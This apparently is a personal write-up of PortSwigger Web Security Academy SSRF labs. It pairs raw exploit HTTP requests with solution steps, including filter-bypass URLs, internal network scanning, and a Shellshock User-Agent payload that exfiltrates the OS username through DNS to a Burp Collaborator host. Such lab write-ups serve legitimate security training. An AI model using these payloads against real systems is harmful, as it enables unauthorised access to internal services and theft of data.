### **Server-side request forgery (SSRF)**

https://portswigger.net/web-security/ssrf



#### Basic SSRF against the local server

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a36000903386661c0065cbd006200b5.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54

stockApi=http://localhost/admin/delete?username=carlos
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Browse to <code>/admin</code> and observe that you can't directly access the admin page.
                    </li>
                    <li>
                        Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
                    </li>
                    <li>
                        Change the URL in the <code>stockApi</code> parameter to <code>http://localhost/admin</code>. This should display the administration interface.
                    </li>
                    <li>
                        <p>
                            Read the HTML to identify the URL to delete the target user, which is:
                        </p>
                        <code class="code-scrollable">http://localhost/admin/delete?username=carlos</code>
                    </li>
                    <li>
                        Submit this URL in the <code>stockApi</code> parameter, to deliver the SSRF attack.
                    </li>
                </ol>
            </div>
        </div>




#### Basic SSRF against another back-end system

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 

exploit(Send to Intruder)

```http
POST /product/stock HTTP/1.1
Host: 0a1800d90476ebb3c0ac6c8700700017.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://192.168.0.75:8080/admin/delete?username=carlos
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Intruder.
                    </li>
                    <li>
                        Click "Clear §", change the <code>stockApi</code> parameter to <code>http://192.168.0.1:8080/admin</code> then highlight the final octet of the IP address (the number <code>1</code>), click "Add §".
                    </li>
                    <li>
                        Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
                    </li>
                    <li>
                        Click "Start attack".
                    </li>
                    <li>
                        Click on the "Status" column to sort it by status code ascending. You should see a single entry with a status of 200, showing an admin interface.
                    </li>
                    <li>
                        Click on this request, send it to Burp Repeater, and change the path in the <code>stockApi</code> to: <code>/admin/delete?username=carlos</code>
                    </li>
                </ol>
            </div>
        </div>




#### SSRF with blacklist-based input filter

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
>
> The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0afd006103a4a549c0a2a300006700dd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

stockApi=http://127.1/aDmin/delete?username=carlos
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
                    </li>
                    <li>
                        Change the URL in the <code>stockApi</code> parameter to <code>http://127.0.0.1/</code> and observe that the request is blocked.
                    </li>
                    <li>
                        Bypass the block by changing the URL to: <code>http://127.1/</code>
                    </li>
                    <li>
                        Change the URL to <code>http://127.1/admin</code> and observe that the URL is blocked again.
                    </li>
                    <li>
                        Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface and delete the target user.
                    </li>
                </ol>
            </div>
        </div>




#### SSRF with filter bypass via open redirection vulnerability

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos.
>
> The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a2700cc04b6f956c1795754002c0036.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 109

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
                    </li>
                    <li>
                        Try tampering with the <code>stockApi</code> parameter and observe that it isn't possible to make the server issue the request directly to a different host.
                    </li>
                    <li>
                        Click "next product" and observe that the <code>path</code> parameter is placed into the Location header of a redirection response, resulting in an open redirection.
                    </li>
                    <li>
                        <p>
                            Create a URL that exploits the open redirection vulnerability, and redirects to the admin interface, and feed this into the <code>stockApi</code> parameter on the stock checker:
                        </p>
                        <code class="code-scrollable">/product/nextProduct?path=http://192.168.0.12:8080/admin</code>
                    </li>
                    <li>
                        Observe that the stock checker follows the redirection and shows you the admin page.
                    </li>
                    <li>
                         <p>
                             Amend the path to delete the target user:
                         </p>
                        <code class="code-scrollable">/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</code>
                    </li>
                </ol>
            </div>
        </div>




#### Blind SSRF with out-of-band detection

> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
>
> To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server. 

exploit

```http
GET /product?productId=1 HTTP/1.1
Host: 0a14004f034595dac0093c7000270063.web-security-academy.net
Referer: http://md334ugs3kp20r7iwsork1mnqew4kt.burpcollaborator.net
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        In Burp Suite Professional, go to the Burp menu and launch the Burp Collaborator client.
                    </li>
                    <li>
                        Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
                    </li>
                    <li>
                        Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
                    </li>
                    <li>
                        Change the Referer header to use the generated Burp Collaborator domain in place of the original domain. Send the request.
                    </li>
                    <li>
                        Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
                    </li>
                    <li>
                        You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
                    </li>
                </ol>
            </div>
        </div>

#### SSRF with whitelist-based input filter

> This lab has a stock check feature which fetches data from an internal system.
>
> To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
>
> The developer has deployed an anti-SSRF defense you will need to bypass. 

exploit

```http
POST /product/stock HTTP/1.1
Host: 0a370059030c95d3c03b3eba0054000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
                    </li>
                    <li>
                        Change the URL in the <code>stockApi</code> parameter to <code>http://127.0.0.1/</code> and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
                    </li>
                    <li>
                        Change the URL to <code>http://username@stock.weliketoshop.net/</code> and observe that this is accepted, indicating that the URL parser supports embedded credentials.
                    </li>
                    <li>
                        Append a <code>#</code> to the username and observe that the URL is now rejected.
                    </li>
                    <li>
                        Double-URL encode the <code>#</code> to <code>%2523</code> and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
                    </li>
                    <li>
                        <p>
                            To access the admin interface and delete the target user, change the URL to:
                        </p>
                            <code class="code-scrollable">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</code>
                    </li>
                </ol>
            </div>
        </div>




#### Blind SSRF with Shellshock exploitation

> This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.
>
> To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user. 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        In Burp Suite Professional, install the "Collaborator Everywhere" extension from the BApp Store.
                    </li>
                    <li>
                        Add the domain of the lab to Burp Suite's target scope, so that Collaborator Everywhere will target it.
                    </li>
                    <li>
                        Browse the site.
                    </li>
                    <li>
                        Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the Referer header.
                    </li>
                    <li>
                        Observe that the HTTP interaction contains your User-Agent string within the HTTP request.
                    </li>
                    <li>
                        Send the request to the product page to Burp Intruder.
                    </li>
                    <li>
                        <p>
                            Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload:
                        </p>
                        <code class="code-scrollable">() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</code>
                    </li>
                    <li>
                        Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
                    </li>
                    <li>
                        Click "Clear §", change the Referer header to <code>http://192.168.0.1:8080</code> then highlight the final octet of the IP address (the number <code>1</code>), click "Add §".
                    </li>
                    <li>
                        Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255, and 1 in the "From" and "To" and "Step" boxes respectively.
                    </li>
                    <li>
                        Click "Start attack".
                    </li>
                    <li>
                        When the attack is finished, go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously. You should see a DNS interaction that was initiated by the back-end system that was hit by the successful blind SSRF attack. The name of the OS user should appear within the DNS subdomain.
                    </li>
                    <li>
                        To complete the lab, enter the name of the OS user.
                    </li>
                </ol>
            </div>
        </div>

exploit (Send to Intruder)

```http
GET /product?productId=1 HTTP/1.1
Host: 0a3800230347e306c03767cb00030089.web-security-academy.net
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).i8rztvkx4dnhbbhnle6bi0zxyo4fs4.burpcollaborator.net
Referer: http://192.168.0.1:8080
```

Burp Collaborator Client

```
The Collaborator server received a DNS lookup of type A: peter-l****E.i8rztvkx4dnhbbhnle6bi0zxyo4fs4.burpcollaborator.net.
```

